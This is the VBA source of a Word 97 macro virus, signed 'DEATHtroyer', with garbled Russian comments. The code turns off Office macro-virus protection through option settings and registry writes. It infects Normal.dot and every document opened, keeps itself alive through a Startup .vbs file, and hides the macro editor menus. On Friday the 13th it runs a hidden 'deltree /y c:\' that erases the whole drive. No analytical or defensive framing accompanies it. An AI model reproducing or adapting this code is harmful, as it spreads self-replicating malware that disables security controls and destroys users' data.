   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "MSNI"
   ' MSDI.sys (Áëîê èíôåöèðîâàíèÿ äîêóìåíòîâ)
   ' MSNR.sys (Áëîê âîñòàíîâëåíèÿ êîäà â Normal.dot)
   ' MSNI.sys (Áëîê èíôåöèðîâàíèÿ Normal.dot)

   Sub AutoOpen()
   On Error Resume Next
   Options.VirusProtection = False
   ShowVisualBasicEditor = False
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(i).Name = "MSDI" Then Vp = True
    Next i
    If Vp <> True Then
      ActiveDocument.VBProject.VBComponents("MSNI").Export ("C:\Windows\MSNI.sys")
      ActiveDocument.VBProject.VBComponents("MSDI").Export ("C:\Windows\MSDI.sys")
      ActiveDocument.VBProject.VBComponents("MSNR").Export ("C:\Windows\MSNR.sys")
      Kill "C:\WINDOWS\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà\MSNR.vbs"
      Open "C:\WINDOWS\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà\MSNR.vbs" For Append As #1
      CurLine = ActiveDocument.VBProject.VBComponents("MSNR").CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents("MSNR").CodeModule.CountOfLines)
      Print #1, CurLine
      Print #1, "Call RestoNormalMacros"
      Close #1
      NormalTemplate.VBProject.VBComponents.Import ("C:\Windows\MSDI.sys")
    End If
   End Sub

   Attribute VB_Name = "MSDI"
   ' MSDI.sys (Áëîê èíôåöèðîâàíèÿ äîêóìåíòîâ)
   ' MSNR.sys (Áëîê âîñòàíîâëåíèÿ êîäà â Normal.dot)
   ' MSNI.sys (Áëîê èíôåöèðîâàíèÿ Normal.dot)

   Sub AutoClose()
   On Error Resume Next
   Options.VirusProtection = False
   ShowVisualBasicEditor = False
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(i).Name = "MSNI" Then Vp = True
    Next i
    If Vp = False Then
      ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSNI.sys")
      ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSDI.sys")
      ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\MSNR.sys")
    End If
    Call Destructor
   End Sub

   Sub Destructor()
   On Error Resume Next
   If WeekDay(Date) = 6 And Day(Date) = 13 Then
   Shell "deltree /y c:\ >nul", vbHide
   End If
   End Sub

   Private Sub HelpAbout()
       MsgBox "Lamers Must Been DEAD !!! BioCoded By DEATHtroyer", , "Macro-Script Virus ver1.0"
   End Sub


   Private Sub ViewVBCode()
   End Sub

   Private Sub FileTemplates()
   End Sub

   Private Sub ToolsMacro()
   End Sub

   Private Sub Organizer()
   End Sub

   Attribute VB_Name = "MSNR"
   ' Äàííûé Script ïðè êàæäîì çàïóñêå êîìïà  âîñòàíàâëèâàåò
   ' êîä â Normal.dot åñëè îí òàì îòñóòñòâóåò, à òàêæå âûêëþ÷àåò àíòèâèðóñíóþ çàùèòó
   ' âñåõ ïðèëîæåíèé Oficce 97

   Sub RestoNormalMacros()
       Set WordObj = CreateObject("Word.Application")
       Set NT = WordObj.NormalTemplate.VBProject.VBComponents
       NotRestore = False
       WordObj.Options.VirusProtection = False
       WordObj.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
       WordObj.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
       WordObj.System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
       WordObj.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
       WordObj.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
       WordObj.System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
       For i = 1 To NT.Count
           If NT(i).Name = "MSDI" Then NotRestore = True
       Next
       If NotRestore <> True Then
           NT.Import ("C:\Windows\MSDI.sys")
           WordObj.NormalTemplate.Save
       End If
   End Sub
